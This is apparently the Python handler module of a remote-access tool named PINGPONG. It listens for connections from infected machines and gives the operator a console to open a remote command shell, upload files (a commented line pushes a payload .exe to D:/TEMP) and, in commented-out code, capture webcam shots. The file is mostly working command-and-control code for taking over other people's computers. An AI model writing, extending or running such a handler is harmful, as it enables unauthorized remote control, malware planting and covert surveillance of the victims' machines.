# -*- coding:utf-8 -*-
# @FileName  :handler.py
# @Time      :2022/11/07 21:23:35
# @Author    :D0WE1L1N
import random
import socket
# import threading
import sys
import main
#开启监听
#函数中printf参数决定时候进行不必要的输出
def startserver(ip, port, printf, open_ac):
    if printf and False:
        AUTORUNSCRIPT = input("handler>[*]Any AUTORUN COMMAND?(blank for no)>")
    else:
        AUTORUNSCRIPT = " "
    if port == "":
        port = 624
    if ip == "":
        ip = "127.0.0.1"
    else:
        try:
            port = int(port)
        except:
            main.print_error("handler>[-]port input error")
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        try:
            s.bind((ip, port))
            s.listen(10)
        except:
            main.print_error("handler[-]Failed to bind on " + ip + ":" + port)
            main.print_normal("handler[*]Bind on 127.0.0.1:624")
            startserver("127.0.0.1", "624", True, False)
    except socket.error as msg:
        main.print_error("handler>[-]something went WRONG, print out the wrong msg: " + str(msg))
        sys.exit(1)
    if printf:
        main.print_normal('handler>[*]Starting handler at ' + ip + ":" + str(port))

    while True:
        try:
            conn, addr = s.accept()
        except KeyboardInterrupt:
            main.print_normal("handler>[*]Stoping......")
            main.startserver()
        import PINGPONG_script.upload
        _ip = addr[0]
        _port = addr[1]
        # PINGPONG_script.upload.Upload(_ip, "./payload/upload_payload/PINGPONG_payload.exe", "D:/TEMP", False, False, conn, "")
        if printf:
            main.print_normal('handler>[*]PINGPONG session Created: ' + ip + ":" + str(port) + " >>> " + _ip + ":" + str(_port))
        # t = threading.Thread(target=PINGPONG_shell, args=(conn, ip, port, _ip, str(_port), True, AUTORUNSCRIPT, open_ac))
        # t.start()
        PINGPONG_shell(conn, ip, port, _ip, str(_port), True, AUTORUNSCRIPT, open_ac)
#连接程序
def PINGPONG_shell(conn, my_ip, my_port, ip, port, printf, AUTOCOMMAND, op_ac):
    #请求发送函数：检查连接
    import PINGPONG_script.addsend
    is_Auto = True
    while True:
        #主循环
        if is_Auto:
            command = input("PINGPONG>")
        else:
            print("PINGPONG>[*]running " + AUTOCOMMAND)
            command = AUTOCOMMAND
            is_Auto = True
        # if command == "cam_shot" or command == "CAM_SHOT":
        #     import PINGPONG_script.camera
        #     PINGPONG_script.camera.cam_shot(PINGPONG_script.addsend, conn)
        #     try:
        #         import cv2      
        #         img = cv2.imread('shot.jpg',1)
        #         cv2.imshow('imshow',img)
        #         cv2.waitKey(0)
        #         cv2.destroyAllWindows()
        #     except:
        #         print("PINGPONG>[*]Failed to open it, You might not installed open-cv, but it doesn't really important")
        if command == "exit" or command == "EXIT":
            conn.send(bytes("EXIT_APP", 'utf8'))
            main.print_normal("PINGPONG>[*]PINGPONG session Died, reason: User exit")
            main.print_normal("handler>[*]Back to main console......")
            main.main()
        elif command == "cmd" or command == "CMD":
            import PINGPONG_script.cmdshell
            if PINGPONG_script.addsend.App_send("CMDSHELL_APP", True, conn):
                main.print_good("PINGPONG>[+]GOT IT")
                cmd_port = random.randint(5000, 8000)
                conn.send(bytes(str(cmd_port), "utf8"))
                PINGPONG_script.cmdshell.start(my_ip, cmd_port)
        elif command == "upload" or command == "UPLOAD":
            import PINGPONG_script.upload
            file_dir = input("PINGPONG>[*]Please input the location of the file in your host>")
            to_dir = input("PINGPONG>[*]Please input the location of the file where you uploaded>")
            PINGPONG_script.upload.Upload(ip, file_dir, to_dir, True, True, conn, PINGPONG_script.addsend)
        elif command == "info" or command == "INFO":
            print("PINGPONG>[*]Connection: " + my_ip + ":" + str(my_port) + " >>> " + ip + ":" + port)
        elif command == "ping" or command == "PING":
            if PINGPONG_script.addsend.App_send("CHECK_APP", False, conn):
                print("PINGPONG>[*]PONG")
        else:
            print("PINGPONG>[-]Command " + command + " not found")                 
if __name__ == "__main__":
    startserver("127.0.0.1", "", True, True)